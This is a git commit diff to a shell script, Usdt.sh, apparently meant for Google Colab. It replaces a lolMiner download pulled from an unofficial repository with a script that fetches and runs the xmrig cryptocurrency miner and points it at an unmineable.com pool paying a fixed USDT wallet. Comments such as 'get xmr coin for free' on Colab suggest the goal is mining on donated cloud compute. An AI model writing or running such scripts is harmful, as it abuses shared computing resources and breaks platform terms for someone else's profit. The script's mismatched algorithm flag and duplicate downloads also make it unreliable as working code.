78e12c9721fd2fe0f0505795c113905c4be8cc45
justjust123 <108263005+justjust123@users.noreply.github.com>
2022-09-12 03:01:22 +0700

    Update Usdt.sh

--- Usdt.sh
+++ Usdt.sh
@@ -1,6 +1,13 @@
-#!/bin/bash
-apt-get install wget -y
-wget https://github.com/Kocalkocal93Kocalkocal93/tuyul.sh/raw/main/abc.tar.gz
-tar -xvf abc.tar.gz
-cd 1.34a
-./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user USDT:TFV2Lz82FGocoXdBJuc9tJSREcTZFSxav2.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)#hthp-17hh --ethstratum ETHPROXY
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o ethash.unmineable.com:3333 -a rx -k -u USDT:TFV2Lz82FGocoXdBJuc9tJSREcTZFSxav2.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)#hthp-17hh -p x
